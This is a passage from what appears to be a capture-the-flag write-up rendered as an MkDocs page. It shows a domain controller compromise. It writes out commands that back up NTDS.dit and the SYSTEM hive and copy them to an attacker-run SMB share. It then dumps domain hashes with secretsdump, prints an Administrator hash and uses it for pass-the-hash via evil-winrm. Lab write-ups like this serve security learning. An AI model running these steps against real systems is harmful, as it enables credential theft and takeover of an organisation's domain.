+<h3 id="setting-up-smb-server">Setting Up SMB Server</h3>
+<p>I set up an SMB server on my attack machine to receive the backup files:
+<div class="highlight"><pre><span></span><code>impacket-smbserver<span class="w"> </span>smb<span class="w"> </span>.<span class="w"> </span>-smb2support<span class="w"> </span>-username<span class="w"> </span>smb<span class="w"> </span>-password<span class="w"> </span>pass
+</code></pre></div></p>
+<h3 id="domain-controller-backup">Domain Controller Backup</h3>
+<p>On the target, I mounted my SMB share and performed a backup of the NTDS.dit file:
+<div class="highlight"><pre><span></span><code><span class="n">net</span> <span class="n">use</span> <span class="n">k</span><span class="p">:</span> <span class="p">\\</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">42</span><span class="p">\</span><span class="n">smb</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">smb</span> <span class="n">pass</span>
+<span class="nb">echo </span><span class="s2">&quot;Y&quot;</span> <span class="p">|</span> <span class="n">wbadmin</span> <span class="nb">start </span><span class="n">backup</span> <span class="n">-backuptarget</span><span class="p">:\\</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">42</span><span class="p">\</span><span class="n">smb</span> <span class="n">-include</span><span class="p">:</span><span class="n">c</span><span class="p">:\</span><span class="n">windows</span><span class="p">\</span><span class="n">ntds</span>
+</code></pre></div></p>
+<p>I then identified the backup version and initiated recovery:
+<div class="highlight"><pre><span></span><code><span class="n">wbadmin</span> <span class="n">get</span> <span class="n">versions</span>
+<span class="nb">echo </span><span class="s2">&quot;Y&quot;</span> <span class="p">|</span> <span class="n">wbadmin</span> <span class="nb">start </span><span class="n">recovery</span> <span class="n">-version</span><span class="p">:</span><span class="n">11</span><span class="p">/</span><span class="n">19</span><span class="p">/</span><span class="n">2024</span><span class="p">-</span><span class="n">01</span><span class="p">:</span><span class="n">15</span> <span class="n">-itemtype</span><span class="p">:</span><span class="n">file</span> <span class="n">-items</span><span class="p">:</span><span class="n">c</span><span class="p">:\</span><span class="n">windows</span><span class="p">\</span><span class="n">ntds</span><span class="p">\</span><span class="n">ntds</span><span class="p">.</span><span class="n">dit</span> <span class="n">-recoverytarget</span><span class="p">:</span><span class="n">c</span><span class="p">:\</span> <span class="n">-notrestoreacl</span>
+</code></pre></div></p>
+<h3 id="registry-hive-extraction">Registry Hive Extraction</h3>
+<p>I also extracted the SYSTEM registry hive:
+<div class="highlight"><pre><span></span><code><span class="n">reg</span> <span class="n">save</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SYSTEM</span> <span class="n">C</span><span class="p">:\</span><span class="n">system</span><span class="p">.</span><span class="n">hive</span>
+</code></pre></div></p>
+<p>And copied both files back to my attack machine:
+<div class="highlight"><pre><span></span><code><span class="nb">copy </span><span class="n">C</span><span class="p">:\</span><span class="n">ntds</span><span class="p">.</span><span class="n">dit</span> <span class="p">\\</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">42</span><span class="p">\</span><span class="n">smb</span><span class="p">\</span><span class="n">ntds</span><span class="p">.</span><span class="n">dit</span>
+<span class="nb">copy </span><span class="n">C</span><span class="p">:\</span><span class="n">system</span><span class="p">.</span><span class="n">hive</span> <span class="p">\\</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">42</span><span class="p">\</span><span class="n">smb</span><span class="p">\</span><span class="n">system</span><span class="p">.</span><span class="n">hive</span>
+</code></pre></div></p>
+<h3 id="extracting-domain-hashes">Extracting Domain Hashes</h3>
+<p>Using Impacket's secretsdump, I extracted all domain hashes:
+<div class="highlight"><pre><span></span><code>impacket-secretsdump<span class="w"> </span>-ntds<span class="w"> </span>ntds.dit<span class="w"> </span>-system<span class="w"> </span>system.hive<span class="w"> </span><span class="nb">local</span>
+</code></pre></div></p>
+<p>This revealed the Administrator hash:
+<div class="highlight"><pre><span></span><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
+</code></pre></div></p>
+<h3 id="domain-admin-access">Domain Admin Access</h3>
+<p>With the Administrator hash, I performed a pass-the-hash attack to gain domain admin access:
+<div class="highlight"><pre><span></span><code>evil-winrm<span class="w"> </span>-H<span class="w"> </span>184fb5e5178480be64824d4cd53b99ee<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;Administrator&#39;</span><span class="w"> </span>-i<span class="w"> </span><span class="m">10</span>.129.229.17
+</code></pre></div></p>
+<p>This provided full administrative access to the domain controller, successfully completing the challenge.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.sections", "toc.integrate", "search.suggest", "content.code.copy"], "search": "../../assets/javascripts/workers/search.f8cc74c7.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.c8b220af.min.js"></script>
+      
+    
+  </body>
+</html>
